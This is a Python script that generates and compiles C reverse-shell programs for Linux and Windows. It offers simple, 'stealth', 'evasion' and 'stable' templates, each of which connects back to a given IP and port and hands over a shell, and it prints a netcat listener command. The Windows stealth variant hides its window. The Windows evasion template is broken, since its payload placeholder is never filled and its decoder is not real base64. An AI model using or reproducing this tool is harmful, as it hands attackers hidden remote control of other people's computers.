#!/usr/bin/env python3

import argparse
import base64
import subprocess
import os

# Reverse shell templates for different systems
reverse_shells = {
    "linux": {
        "simple": '''
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {{
    int sockfd;
    struct sockaddr_in serv_addr;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("{ip}");
    serv_addr.sin_port = htons({port});

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sockfd, 0);  // stdin
    dup2(sockfd, 1);  // stdout
    dup2(sockfd, 2);  // stderr

    execve("/bin/sh", NULL, NULL);

    return 0;
}}
''',
        "stealth": '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {{
    int sockfd;
    struct sockaddr_in serv_addr;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("{ip}");
    serv_addr.sin_port = htons({port});

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sockfd, 0);  // stdin
    dup2(sockfd, 1);  // stdout
    dup2(sockfd, 2);  // stderr

    char * const argv[] = {{"/bin/bash", "-i", NULL}};
    execve("/bin/bash", argv, NULL);

    return 0;
}}
''',
        "evasion": '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {{
    int sockfd;
    struct sockaddr_in serv_addr;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("{ip}");
    serv_addr.sin_port = htons({port});

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sockfd, 0);  // stdin
    dup2(sockfd, 1);  // stdout
    dup2(sockfd, 2);  // stderr

    char *command = "/bin/bash -i";
    char *args[] = {{command, NULL}};
    execve("/bin/bash", args, NULL);

    return 0;
}}
''',
        "stable_linux": '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>

int main() {{
    int sockfd;
    struct sockaddr_in serv_addr;

    // Configure the connection details
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("{ip}");
    serv_addr.sin_port = htons({port});

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {{
        perror("Socket creation failed");
        return 1;
    }}

    // Connect to the listener
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {{
        perror("Connection failed");
        close(sockfd);
        return 1;
    }}

    // Redirect stdin, stdout, and stderr to the socket
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);

    // Execute /bin/sh with interactive mode (-i)
    execl("/bin/sh", "/bin/sh", "-i", NULL);

    // If exec fails, exit
    perror("execl failed");
    close(sockfd);
    return 1;
}}
'''
    },
    "windows": {
        "simple": '''
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16] = "{ip}";
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main() {{
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    hax.sin_family = AF_INET;
    hax.sin_port = htons({port});
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    return 0;
}}
''',
        "stealth": '''
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16] = "{ip}";
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main() {{
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    hax.sin_family = AF_INET;
    hax.sin_port = htons({port});
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
    sui.wShowWindow = SW_HIDE;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    return 0;
}}
''',
        "evasion": '''
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

char b64_payload[] = "{b64_payload}";

void decode(char *out, const char *in, int len) {{
    int i, j = 0;
    for (i = 0; i < len; i += 4) {{
        unsigned char a = (in[i] - 'A') & 63;
        unsigned char b = (in[i + 1] - 'A') & 63;
        unsigned char c = (in[i + 2] - 'A') & 63;
        unsigned char d = (in[i + 3] - 'A') & 63;
        out[j++] = (a << 2) | (b >> 4);
        out[j++] = (b << 4) | (c >> 2);
        out[j++] = (c << 6) | d;
    }}
    out[j] = '\\0';
}}

int main() {{
    WSADATA wsaData;
    SOCKET s1;
    struct sockaddr_in hax;
    char ip_addr[16] = "{ip}";
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    hax.sin_family = AF_INET;
    hax.sin_port = htons({port});
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

    char decoded_cmd[256];
    decode(decoded_cmd, b64_payload, sizeof(b64_payload) - 1);
    
    CreateProcess(NULL, decoded_cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    return 0;
}}
'''
    }
}

def compile_code(output_file, system):
    try:
        if system == "linux":
            compile_command = f"gcc {output_file} -o {output_file.split('.')[0]}"
        elif system == "windows":
            compile_command = f"x86_64-w64-mingw32-gcc {output_file} -o {output_file.split('.')[0]}.exe -lws2_32"
        else:
            print(f"\033[91mError: Unsupported system '{system}'\033[0m")
            return False
        
        print(f"\033[93mCompiling with command:\033[0m {compile_command}")
        result = subprocess.run(compile_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if result.returncode == 0:
            print(f"\033[92mCompilation successful!\033[0m")
            os.remove(output_file)
            return True
        else:
            print(f"\033[91mCompilation failed!\033[0m\n{result.stderr.decode()}")
            return False
    except subprocess.CalledProcessError as e:
        print(f"\033[91mCompilation error:\033[0m\n{e.stderr.decode()}")
        return False

def generate_reverse_shell(ip, port, shell_type, system, output_file, compile_flag):
    if shell_type == "stable_linux":
        system = "linux"  # Automatically set to Linux for the stable_linux type

    if system not in reverse_shells:
        print(f"\033[91mError: Invalid system '{system}'. Available systems: {', '.join(reverse_shells.keys())}\033[0m")
        return
    
    if shell_type not in reverse_shells[system]:
        print(f"\033[91mError: Invalid shell type '{shell_type}' for system '{system}'. Available types: {', '.join(reverse_shells[system].keys())}\033[0m")
        return

    shell_code = reverse_shells[system][shell_type].format(ip=ip, port=port)

    if output_file:
        if not output_file.endswith('.c'):
            output_file += '.c'
        with open(output_file, 'w') as file:
            file.write(shell_code)
        print(f"\033[92mReverse shell code saved to {output_file}\033[0m")
        
        if compile_flag:
            if not compile_code(output_file, system):
                print(f"\033[91mFailed to compile the code.\033[0m")
            else:
                print(f"\033[93mTo start the listener, use the following command:\033[0m\n\033[94mrlwrap nc -nlvp {port}\033[0m")
        else:
            compile_command = f"gcc {output_file} -o {output_file.split('.')[0]}" if system == "linux" else f"x86_64-w64-mingw32-gcc {output_file} -o {output_file.split('.')[0]}.exe -lws2_32"
            print(f"\n\033[93mTo compile manually, use the following command:\033[0m\n\033[94m{compile_command}\033[0m\n")
    else:
        print(shell_code)

if __name__ == "__main__":
    usage_examples = """
Usage Examples:

1. Generate and compile a simple reverse shell for Linux:
   python C-shells-creator.py --ip 192.168.1.10 --port 4444 --type simple --system linux --output simple_shell.c --compile

2. Generate a stealth reverse shell for Windows (without compiling):
   python C-shells-creator.py --ip 192.168.1.10 --port 4444 --type stealth --system windows --output stealth_shell.c

3. Generate and compile an evasion reverse shell for Linux:
   python C-shells-creator.py --ip 192.168.1.10 --port 4444 --type evasion --system linux --output evasion_shell.c --compile

4. Generate and compile a stable, fully interactive reverse shell for Linux:
   python C-shells-creator.py --ip 192.168.1.10 --port 4444 --type stable_linux --output stable_shell.c --compile

Note: The --system value is ignored when the --type is "stable_linux" as it is exclusive to Linux.
"""
    
    parser = argparse.ArgumentParser(
        description="Generate a reverse shell C code",
        epilog=usage_examples,
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--ip", required=True, help="IP address of the listener")
    parser.add_argument("--port", required=True, help="Port of the listener")
    parser.add_argument("--type", required=True, help="Type of shell (simple, stealth, evasion, stable_linux)")
    parser.add_argument("--system", required=False, help="Target system (windows, linux)")
    parser.add_argument("--output", help="Output file name")
    parser.add_argument("--compile", action="store_true", help="Compile the generated C code")

    args = parser.parse_args()

    generate_reverse_shell(args.ip, args.port, args.type, args.system, args.output, args.compile)
